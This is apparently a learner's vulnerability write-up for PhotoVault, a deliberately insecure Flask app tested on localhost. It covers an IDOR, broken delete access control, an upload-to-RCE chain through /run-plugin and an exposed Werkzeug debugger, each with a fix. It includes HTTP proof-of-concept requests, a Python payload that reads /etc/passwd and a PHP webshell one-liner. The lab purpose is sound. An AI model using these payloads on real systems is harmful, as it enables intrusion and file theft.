# Vulnerability write-ups

Findings from testing my own app, PhotoVault, against itself. Target for
all of these: `http://127.0.0.1:5001`, running locally via
`docker compose up`.

I've kept my own engagement notes at the end, including what I tried that
*didn't* work, because the wrong turns were part of actually learning this
— not just the clean exploit chain at the end.

---

## 1. Insecure Direct Object Reference (IDOR) — photo access by filename

**Severity:** High — bypasses the app's "private" flag entirely with no
authentication required.

**Location:** `GET /static/uploads/<filename>` (Flask's built-in static
file route)

**Steps to reproduce:**
1. Note that photos marked "private" during upload are still saved to
   `static/uploads/` under their original filename, same as public photos.
2. Request that file directly, with no login and no session cookie:
   `/static/uploads/<filename>`

**Proof of concept:**
```
GET /static/uploads/some_private_photo.png HTTP/1.1
Host: 127.0.0.1:5001
```
Response: returns the image, even for a photo marked private and even
with no session cookie attached.

**Impact:** The `is_private` flag only controls whether a photo shows up
in listings (the gallery, the homepage). It does nothing to protect the
underlying file: anyone who knows or guesses the filename can pull it
directly from `/static/uploads/`, bypassing the privacy setting and any
login requirement completely. Filenames are the original uploaded name
(not randomized), which makes guessing or enumerating them realistic.

**Fix:** "Private" needs to be enforced at the point files are served, not
just in what's listed:
- Store uploaded files outside the public `static/` directory entirely.
- Serve them through an authenticated route that checks the requester
  owns the photo (or that it isn't marked private) before returning it,
  the same way `/notes/<id>` should in the companion lab,
  [insecure-notes](https://github.com/ZProtons/insecure-notes).
- Randomize stored filenames so the original name isn't guessable, as
  defense in depth (not a substitute for the access check above).

---

## 2. Broken Access Control — `/photos/<id>/delete`

**Severity:** High — any authenticated user can delete any other user's
photos.

**Location:** `POST /photos/<photo_id>/delete` (`app/app.py`,
`delete_photo`)

**Steps to reproduce:**
1. Log in as any user.
2. Find or guess a photo id belonging to a different user (ids are
   sequential integers).
3. Send a delete request for that id.

**Proof of concept:**
```
POST /photos/2/delete HTTP/1.1
Host: 127.0.0.1:5001
Cookie: session=<attacker's own session cookie>
```
Response: `302` redirect to the gallery, and the target photo is gone from
both the database and disk — regardless of who actually owns it.

**Impact:** The route checks only that a valid session exists, not that
the session's user owns the photo being deleted. Combined with sequential,
guessable ids, this lets any logged-in user wipe out any other user's
entire gallery.

**Fix:**
```python
photo = db.execute(
    "SELECT * FROM photos WHERE id = ? AND owner_id = ?",
    (photo_id, user["id"]),
).fetchone()
if photo is None:
    abort(404)
```

---

## 3. Unrestricted File Upload → Remote Code Execution (via `/run-plugin`)

**Severity:** Critical — full, unauthenticated-beyond-login code execution
on the server.

**Location:** `POST /upload` (no file validation) chained with
`GET /run-plugin?file=...` (`app/app.py`, `upload` and `run_plugin`)

**Steps to reproduce:**
1. Log in as any user.
2. Write a malicious payload and save it with a `.py` extension:
   ```python
   # exploit.py
   import subprocess
   print(subprocess.run(["cat", "/etc/passwd"], capture_output=True, text=True).stdout)
   ```
3. Upload it through the normal `/upload` form, in the `photo` field — the
   endpoint performs no check on extension, content-type, or file content.
4. Request the plugin-execution endpoint with the uploaded filename:
   `/run-plugin?file=exploit.py`

**Proof of concept:**
```
POST /upload HTTP/1.1
Host: 127.0.0.1:5001
Cookie: session=<session cookie>
Content-Type: multipart/form-data; boundary=----X

------X
Content-Disposition: form-data; name="photo"; filename="exploit.py"

import subprocess
print(subprocess.run(["cat", "/etc/passwd"], capture_output=True, text=True).stdout)
------X
Content-Disposition: form-data; name="caption"

kali
------X--
```
```
GET /run-plugin?file=exploit.py HTTP/1.1
Host: 127.0.0.1:5001
Cookie: session=<session cookie>
```
Response: `200 OK`, body includes the full contents of `/etc/passwd`,
confirming arbitrary command execution in the server's context.

**Impact:** Two bugs combine into full RCE:
- `/upload` accepts any file with no extension, content-type, or magic-byte
  validation, and keeps the original filename.
- `/run-plugin` was built to run "trusted admin post-processing scripts"
  out of the uploads folder, but never checks who uploaded the file or
  whether it's actually a legitimate plugin — it will execute any `.py`
  file sitting in that directory, including one a regular, non-admin user
  just uploaded through the completely unrestricted endpoint above.

An attacker with any valid login can run arbitrary commands as the
application's OS user — read any file it can read, pivot to other
internal systems, or use the app server as a foothold.

**Fix:**
- Validate uploads against an allowlist of extensions (e.g. `.png`,
  `.jpg`, `.gif`) *and* verify the file's actual content matches
  (check magic bytes / use a library like `python-magic`, don't trust the
  extension or `Content-Type` header alone).
- Remove the "run any `.py` file from uploads" feature entirely, or if a
  plugin system is genuinely needed, store plugins outside any
  user-writable directory, and require them to be placed there by an
  admin through a separate, properly authenticated path — never execute
  anything from a directory that unprivileged users can write to.

---

## 4. Werkzeug Debug Console Exposed → Remote Code Execution

**Severity:** Critical.

**Location:** `GET /console` (Werkzeug's built-in interactive debugger,
automatically exposed because the app runs with `debug=True`)

**Steps to reproduce:**
1. Enumerate directories with `dirb`/`gobuster` against the running app —
   `/console` is not linked anywhere in the UI, so this isn't found by
   browsing normally.
2. Request `/console` — it returns the Werkzeug debugger's console page,
   locked behind a PIN.
3. Obtain the PIN: it's printed to the server's own stdout every time the
   process starts (`* Debugger PIN: XXX-XXX-XXX`).
4. Enter the PIN to unlock the console, then execute arbitrary Python.

**Proof of concept:**
```
GET /console HTTP/1.1
Host: 127.0.0.1:5001
```
Response: `200 OK`, Werkzeug debugger console page, PIN-locked.

Console input, once unlocked:
```python
import subprocess
print(subprocess.run(["cat", "/etc/passwd"], capture_output=True, text=True).stdout)
```
Output: full contents of `/etc/passwd`.

**Impact:** `debug=True` is meant for local development only. It exposes a
live, interactive Python shell running inside the application process to
anyone who can reach the `/console` endpoint and unlock it with the PIN.
This is a well-documented, common real-world misconfiguration — it shows
up in production deployments where a developer forgot to disable debug
mode before shipping.

**Honest limitation of this PoC:** I obtained the PIN from the server's
own console output, which I had access to because I'm running this app
myself as the lab operator. In a real, fully external/blind engagement, an
attacker wouldn't have that shortcut — they'd need either a way to read
server-side logs/output some other way, or to exploit known weaknesses in
how Werkzeug derives the PIN from predictable machine/environment values
(a technique that's been publicly documented, but I haven't yet learned
how to do it myself). I'm noting this gap rather than overstating what I
demonstrated.

**Fix:**
- Never run with `debug=True` outside local development. Set it from an
  environment variable that defaults to `False`, and make sure production
  configs/deployment scripts can't accidentally leave it on.
- If interactive debugging is genuinely needed in a non-local environment,
  restrict access to the debugger at the network level (e.g. bind it to
  localhost only, or require a VPN/bastion), since the PIN alone isn't a
  reliable security boundary.

---

## Engagement notes (what actually happened, including the dead ends)

Documenting this because the wrong turns taught me as much as the final
working exploit:

1. Checked `robots.txt` first out of habit — nothing there.
2. Explored the app's normal flows and found findings #1 and #2 (IDOR via
   direct file access, broken access control on delete) before looking for
   anything related to code execution.
3. Ran `dirb` and found `/console` — recognized it as Werkzeug's debugger
   and therefore a real vulnerability, but didn't yet know how to obtain
   the PIN without server-side access. Came back to this after finding #4.
4. Knowing the upload was unrestricted, my first instinct was a PHP
   webshell embedded in an uploaded HTML file, reachable via a client-side
   "console" UI I built myself that called a `/lab-exec` endpoint I
   assumed existed. Spent about an hour on this before realizing the
   flaw: a browser executing JavaScript has no path into the server at
   all — it can only call endpoints that are actually implemented. This
   was, at best, a self-XSS proof of concept, not RCE.
5. Then tried an actual PHP payload (`<?php system($_GET['cmd']); ?>`)
   uploaded directly and requested via Burp. This also did nothing —
   realized the reason only after checking: PhotoVault is a Python/Flask
   app served by Werkzeug. There is no PHP interpreter anywhere in the
   stack, so `.php` files are just served back as static bytes, never
   executed, regardless of content. The webshell-language has to match
   what the backend can actually run.
6. Switched to a `.py` payload and found the execution sink
   (`/run-plugin`) with help rather than discovering it blind — noting
   that honestly rather than claiming I found it independently. Uploaded
   the `.py` file through the same unrestricted `/upload` endpoint and
   triggered it successfully, confirming finding #3.
7. Returned to the Werkzeug console from step 3 with the PIN visible in my
   own terminal (since I was running the app locally) and confirmed
   finding #4 as a second, independent RCE path.

**Takeaway:** the single most useful debugging step across all of this was
pausing to ask "what is this server actually written in, and what will it
execute?" before trying a payload. Assuming PHP by default (because that's
what most beginner material defaults to) cost the most time.
